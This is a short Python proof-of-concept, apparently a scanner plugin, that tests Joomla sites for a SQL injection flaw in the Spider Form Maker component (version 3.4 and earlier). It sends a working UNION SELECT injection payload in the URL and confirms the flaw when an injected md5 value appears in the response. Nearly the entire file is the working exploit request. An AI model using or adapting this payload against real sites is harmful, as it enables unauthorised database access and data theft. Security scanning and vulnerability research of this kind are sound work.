#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Joomla Spider Form Maker <=3.4 SQL
References: http://www.exploit-db.com/exploits/34637/
Author    :  ko0zhi
"""

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = '/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),0x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])